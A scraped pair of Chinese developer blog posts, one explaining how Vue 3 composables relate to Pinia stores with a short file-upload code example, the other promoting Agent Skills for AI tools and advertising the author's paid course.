                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><hr/>
<p>在重构代码（如 <code>useFileHandler.js</code>）时，我们经常会发现逻辑钩子的写法与 Pinia 非常相似。这并非巧合，而是 Vue 3 <strong>响应式编程模型</strong>的高度统一。</p>
<h3 data-id="heading-0">1. 结构大比拼：为什么它们是“双胞胎”？</h3>
<p>无论是 Composable 还是 Pinia，它们都遵循 <strong>State (状态) -&gt; Getters (派生) -&gt; Actions (动作)</strong> 的设计模式。</p>






























<table><thead><tr><th><strong>逻辑单元</strong></th><th><strong>Composable 钩子</strong></th><th><strong>Pinia Store (Setup 写法)</strong></th></tr></thead><tbody><tr><td><strong>定义状态</strong></td><td><code>ref()</code>, <code>reactive()</code></td><td><code>ref()</code>, <code>reactive()</code></td></tr><tr><td><strong>派生数据</strong></td><td><code>computed()</code></td><td><code>computed()</code></td></tr><tr><td><strong>业务方法</strong></td><td><code>function doSomething() { ... }</code></td><td><code>function doSomething() { ... }</code></td></tr><tr><td><strong>暴露结果</strong></td><td><code>return { ... }</code></td><td><code>return { ... }</code></td></tr></tbody></table>
<blockquote>
<p><strong>结论</strong>：Pinia 的 Setup Store 本质上就是一个“被全局管理的 Composable”。</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">2. 本质区别：逻辑克隆 vs. 数据共享</h3>
<p>虽然长得像，但它们的<strong>生命周期</strong>和<strong>作用域</strong>截然不同：</p>
<h4 data-id="heading-2"><strong>Composable (如 <code>useFileHandler</code>) — “逻辑模具”</strong></h4>
<ul>
<li>
<p><strong>私有实例</strong>：每次在组件中 <code>const { ... } = useFileHandler()</code>，都会创建一个<strong>全新的状态</strong>。</p>
</li>
<li>
<p><strong>生命周期</strong>：通常与调用它的组件挂钩（随组件销毁而注销）。</p>
</li>
<li>
<p><strong>核心用途</strong>：<strong>逻辑提取与复用</strong>。</p>
<ul>
<li><em>例子</em>：校验文件大小、格式过滤、图片重命名逻辑。不管在哪里用，这些“动作”是一样的，但处理的文件是当前组件私有的。</li>
</ul>
</li>
</ul>
<h4 data-id="heading-3"><strong>Pinia Store (如 <code>fileStore</code>) — “内存数据库”</strong></h4>
<ul>
<li>
<p><strong>全局单例</strong>：无论在多少个组件中引用，所有组件访问的都是<strong>同一份数据</strong>。</p>
</li>
<li>
<p><strong>永久驻留</strong>：除非刷新页面或手动重置，数据在整个应用生命周期内一直存在。</p>
</li>
<li>
<p><strong>核心用途</strong>：<strong>跨组件状态共享</strong>。</p>
<ul>
<li><em>例子</em>：已上传的文件列表。你在“输入框组件”上传，在“侧边栏组件”要实时看到，这时必须用 Store。</li>
</ul>
</li>
</ul>
<hr/>
<h3 data-id="heading-4">3. 重构实战：它们如何“打配合”？</h3>
<p>在高质量的代码架构中，Composable 往往作为 <strong>“业务协调员”</strong> ，连接组件与 Store：</p>
<p>JavaScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// useFileHandler.js (Composable)</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useFileHandler</span>(<span class="hljs-params">isTranslateMode</span>) {
  <span class="hljs-keyword">const</span> fileStore = <span class="hljs-title function_">useFileStore</span>(); <span class="hljs-comment">// 1. 连接全局数据源 (Store)</span>

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">validate</span> = (<span class="hljs-params">file</span>) =&gt; { <span class="hljs-comment">/* 2. 执行私有校验逻辑 */</span> };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">upload</span> = (<span class="hljs-params">file</span>) =&gt; {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">validate</span>(file)) {
      fileStore.<span class="hljs-title function_">addFile</span>(file);   <span class="hljs-comment">// 3. 校验通过，写入全局状态</span>
    }
  };

  <span class="hljs-keyword">return</span> { upload };
}
</code></pre>
<hr/>
<h3 data-id="heading-5">💡 复习金句（避坑指南）</h3>
<ol>
<li>
<p><strong>传参不带 <code>.value</code></strong>：在组件中调用钩子传入 <code>computed</code> 参数时，直接传变量名（如 <code>useFileHandler(isTranslate)</code>），这样钩子内部才能通过 <code>.value</code> 追踪到响应式变化。</p>
</li>
<li>
<p><strong>职责要分离</strong>：</p>
<ul>
<li><strong>Store</strong> 应该尽量“纯粹”，只管存取数据。</li>
<li><strong>Composable</strong> 负责“脏活累活”，比如复杂的 <code>if-else</code> 校验、粘贴事件解析。</li>
</ul>
</li>
<li>
<p><strong>物归原主</strong>：不属于该逻辑块的配置（如输入框字符限制 <code>inputCharLimit</code>）不要硬塞进 Hook，应保持 Hook 的<strong>单一职责</strong>。</p>
</li>
</ol>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2026 效率分水岭：只会用 AI 提问已经不够了，掌握 Skills 才是硬通货]]></title>    <link>https://juejin.cn/post/7596962344045133864</link>    <guid>https://juejin.cn/post/7596962344045133864</guid>    <pubDate>2026-01-20T02:20:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596962344045133864" data-draft-id="7596962344045084712" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2026 效率分水岭：只会用 AI 提问已经不够了，掌握 Skills 才是硬通货"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-01-20T02:20:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="悟鸣"/> <meta itemprop="url" content="https://juejin.cn/user/4107431171852270"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2026 效率分水岭：只会用 AI 提问已经不够了，掌握 Skills 才是硬通货
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4107431171852270/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    悟鸣
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T02:20:25.000Z" title="Tue Jan 20 2026 02:20:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/10b0798f23f54cfc803f9bc98749126a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=m16B2%2Bwchm3EWaup1Ad27ONkpAY%3D" alt="图片" loading="lazy"/></p>
<p>最近 Agent Skills 非常火爆，2026 年1月1 日到现在，不完全统计 Github 上每天新增（某 Skills 市场收录）的 Skills 1W+，最高一天接近 4W。</p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc0731cc9b584871ab0b278c25255720~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=up1Om1eqRAdvJqdKjHRF1%2BeErbQ%3D" alt="图片" loading="lazy"/></p>
<p>最近很多人问我：</p>
<ul>
<li>学长我不是程序员需要学 Skills 吗？</li>
<li>学长 Skills 是不是只能用来写代码？</li>
<li>学长我想直接发送商品信息，让 Skills 自动帮我按照特定格式生成内容可以吗？</li>
<li>学长我创建 Skills 内容多了模型使用的时候效果不好怎么办？</li>
</ul>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e4f08d34d19a4850aa8eb7ebd79c7d2e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=TOxzhS8wdl8Oo5uHBGlZXV%2F9eIY%3D" alt="图片" loading="lazy"/></p>
<p>昨天看到全栈式工程师 @_kaichen 发表了自己对 Agent Skills 的理解，讲得挺不错，引起了 6W 多次阅读：</p>
<pre><code class="hljs language-objectivec" lang="objectivec">我之前完全误判了 Agent Skills
一直以程序员视角觉得 Skills 只是 Workflow Prompt，有用，但没什么大不了的，对吧？
直到这周看着推上一堆人疯狂分享各种 <span class="hljs-built_in">SKILL</span>，一开始看多了还有点不适，但突然反应过来：
卧槽，这东西不是简单文字，这是新一代的程序，而且还能自我迭代。
传统程序员怎么做功能？用代码编排流程，输入什么、处理什么、输出什么，一行行写死，编译打包交付上线。
Skills 怎么做功能？用 Markdown 写流程说明，告诉它什么场景触发、调用什么工具、输出什么格式。
这简直是大白话编程，用任何自然语言都接受的编程。
再进一步，这 Skills 是活的，是插件化的，是任何人都能轻松定制的。
传统软件，用户拿到只能用，不能改。想加功能？等下版本。有 bug？提工单排队。
Skills 不一样，觉得哪里不顺手，直接打开那个 .md 文件，用人话改几句就生效，甚至能丢 AI 帮你迭代升级。
没有环境配置，没有编译，没有部署。真正一次编写到处使用。
任何人都能拷贝、改造、升级、再分享。
每个人只要用从小学会的语言就能开发，甚至不需要打字，语音下达指令就行。
Agent 时代，人人都是开发者😲
</code></pre>
<hr/>
<p>最近和朋友聊天的时候，有很让人感慨。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3a6ce77de9ad471f9f0a32a00ab1828b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=FGSiXduQ%2BOmoCe8P3Mqeupt8UoE%3D" alt="图片" loading="lazy"/></p>
<p>一个朋友说：“听说”（注意是听说而不是亲身体会）  Skills 挺好，但是平时挺忙的，没时间学啊。让我突然想到了上面这张图。</p>
<p>其实，有些时候恰恰是因为我们没有利用好 AI，把我们从越来越多的重复性的简单任务解放出来，所以才很忙。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/63e2358c7cd54e7e8d98868b59564c18~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=rZ2LYDeM%2FYXawoOOaTA7wqAPf48%3D" alt="图片" loading="lazy"/></p>
<p>举一个简单的例子，以前我校对字幕可能需要花半个小时到一个小时，现在我搞好了Skills，直接让它全自动的校验。我忙我自己的，几分钟后回去全部都搞好了。</p>
<p>像这种例子比比皆是，我掌握了skills 的使用和创建方法，我就可以根据我的工作和学习的场景，越来越多的场景去打造 skills 更全自动的完成。</p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4adb7df70d80486cafdc3b5410e4afbb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=MnLjD%2F0W98aiAAgPxugj%2FrtS5NU%3D" alt="图片" loading="lazy"/></p>
<p>2025 年 AI Coding 大爆发，Cursor、Claude Code、Qoder、Antigravity 等层出不穷，给程序员带来的巨大的效率提升。我现在几乎完全用提示词来写代码了，只需要做一些检查和修改。</p>
<p>2026年 Claude Cowork 的出现，开始真正将能干活的 Agent 走向非程序员群体。国内已经有类似的工具，如ZCode，很多厂商会飞速跟进。能够尽早掌握这些工具，用好 Skills 的人将会和身边人产生巨大的效率差。</p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c4189193e4945d29d49459cf896c83b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=2M%2BP4OEB4kyiCrRN8pctDxlYITc%3D" alt="图片" loading="lazy"/></p>
<p>其实在我看来，<strong>Skills 不是专门给程序员用的“新技术”，更是给所有人工作和学习升级的“新途径”</strong> 。</p>
<p>很多人可能会说，<strong>Skills 和我有什么关系？我为什么要学</strong>？</p>
<p>为了让大家更有体感，我讲几个我已经创建出来正在用的真实的例子：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c05bd8e66f3a4e11afeb033aff1dc7eb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=PhGVXuWHojmp%2FHnOIaVlmJdMkT4%3D" alt="图片" loading="lazy"/></p>
<p>比如说我们经常需要阅读一份材料，如阅读多个官方文档（如小报童官方文档、扣子官方文档、某某流程文档等），来解决问题。</p>
<p>如果没有提供对应的 AI 功能，那么我们可能每次都需要浪费很多时间，找到我们想要解决问题所需要阅读的片段。</p>
<p>搞一个“XX 文档 Skill”,我们下次需要用到这些文档的时候，它就会自动从我们这些 skills 中提取相关信息，回答我们的问题，甚至根据信息自主解决。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c7ade6104a9145c3ade628740226effa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=34llTUDKrp0nqlJ%2BkEKt8KhKybY%3D" alt="图片" loading="lazy"/></p>
<p>我之前录视频会有很多 AI 相关的术语，视频转文字的字幕经常出错，人工校对半小时甚至一个多小时。</p>
<p>如果是以前我可能会在网页上传进一个智能体，然后把文件传上去，校对完了之后下载下来。</p>
<p>如果字幕的文件很长，我还要手动地把它拆成好几份，分别上传，分别粘贴回来，费时费力。</p>
<p>我现在只需要创建一个"字幕校对的 Skills"，我告诉 AI 帮我进行字幕校验，它就会按照我的要求，用我的专属词库进行字幕的校对，几分钟就校验完了，非常快，质量非常好。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/69bfb61c15a841d59ba119b71143820d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=IinEyKi0i97oko17k1KGvGkd9m8%3D" alt="图片" loading="lazy"/></p>
<p>我们之前学习某一个知识点，可能比较枯燥。</p>
<p>我们可能需要看一个文档，然后再把一些不太熟悉的段落复制出来，然后放到网页上问 DeepSeek。</p>
<p>我们只需要创建一个"通俗讲解专家 Skill"，边阅读的时候，圈选让 AI 自动按照我们的想法给我们解读。</p>
<p>如先让它就会用生活化的例子，让我们快速理解 80%；然后用相对通俗的语言进行专业性的讲解；再给我们一些顺口溜或者对比等比较容易记忆的方法；最后画一张图，帮我们非常直观地理解这个知识。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e1e631d0acd24901b5e8ebb95b971ce7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=5hr0VK2rqbqWDDelJ7%2FkkUHMq1I%3D" alt="图片" loading="lazy"/></p>
<p>我之前看一篇论文可能抓不住重点，看完也没留下什么印象。</p>
<p>我们只需要创建一个"论文高效解读专家 Skill"。就可以先用一句话概括论文重点；然后，给出论文创新点；再结合自己的研究领域，给出可能带来的启发；最后，可以让它针对论文提出 5 个相关问题自问自答，帮我们更高效地理解论文。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/56134ae06e334e0d9991058e52cba83c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=bAhOAYffb8lPEpcUeKz6AUko3IQ%3D" alt="图片" loading="lazy"/></p>
<p>比如说我之前需要下载 B 站的视频，之前还需要找一些支持下载的网站存起来，下次还要打开这个网站，网站上还有一些广告，下载的话转换完了还需要手动点击，非常繁琐。</p>
<p>现在我只需要创建一个"视频下载 Skills"，那么下次我直接把 B 站的视频发给他，告诉他下载，他就会自动地帮我下载到指定的目录中。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa9452d84a0444fdba62d2ba19f49044~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=z8%2BNqxUmIp5vdtv7YANh0STj0B8%3D" alt="图片" loading="lazy"/></p>
<p><strong>这种例子还有很多很多</strong>，不管你是软件工程师还是非工程师群体（如产品经理、运营、大学生、大学老师等），掌握 Skills 的使用和自动创建，可以更早享受 AI 带来的真正巨大的效率提升，快速拉开和普通人的差距，解放自己。</p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/968ee3a29a2c4f4099d6f3181e7c2463~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=RDYL42qQwwPuRt0u8wJ14TVNHVY%3D" alt="图片" loading="lazy"/></p>
<p>当前，市面上很多 Skills 相关的文章质量参差不齐，很多人没有真正理解就敢发文章，误人子弟。</p>
<p>官方的 Skills 文档质量很高，对更好地理解 Skills，更高效得创建 Skills，有帮助。</p>
<p>但是很多人看完之后还是不知道怎么去使用和创建，而且自己去创建技能的时候也会遇到很多坑，效果不好也不知道问题出现在哪里，也不知道怎么解决。</p>
<p>我最近出了一个 《手把手带你玩转 Agent Skills：从零基础到实战高手》: <a href="https://link.juejin.cn?target=https%3A%2F%2Fxiaobot.net%2Fp%2Fagent-skills%25C2%25A0%25E7%25BB%2593%25E5%2590%2588%25E8%2587%25AA%25E5%25B7%25B1%25E7%259A%2584%25E5%25AE%259E%25E6%2588%2598%25EF%25BC%258C%25E7%259C%259F%25E6%25AD%25A3%25E8%25AE%25A9%25E5%25A4%25A7%25E5%25AE%25B6%25E5%25BD%25BB%25E5%25BA%2595%25E7%2590%2586%25E8%25A7%25A3" target="_blank" title="https://xiaobot.net/p/agent-skills%C2%A0%E7%BB%93%E5%90%88%E8%87%AA%E5%B7%B1%E7%9A%84%E5%AE%9E%E6%88%98%EF%BC%8C%E7%9C%9F%E6%AD%A3%E8%AE%A9%E5%A4%A7%E5%AE%B6%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3" ref="nofollow noopener noreferrer">xiaobot.net/p/agent-ski…</a> Skills，快速安装使用 Skills，能够根据自己学习和工作场景高效创建 Skills 等。</p>
<hr/>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/353fc76a011d4e43aa58fdb99e26d068~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oKf6bij:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769480425&amp;x-signature=htLlYIhBeN3300Euh16aETqVkrk%3D" alt="图片" loading="lazy"/></p>
<p>专栏大纲如上图所示，计划 18 节，已经更新到 10 节，最近会快速更新完毕。</p>
<p>学完这个专栏，能够灵活使用以及根据自己的工作和学习场景打造适合自己的 Skills，把更多活派发给 AI，解放自己。</p>
<p>想要一起学习 Skills 的朋友，关注微信公众号：<strong>悟鸣AI,</strong> 发送数字“9”，获取专栏链接及粉丝优惠券。</p>
<p>欢迎关注我的公众号，后续会陆续分享比较有用的 AI 工具和比较好的 AI 经验，比较客观理性的 AI 观点等。</p>
<p><img src="" alt="" loading="lazy"/></p>
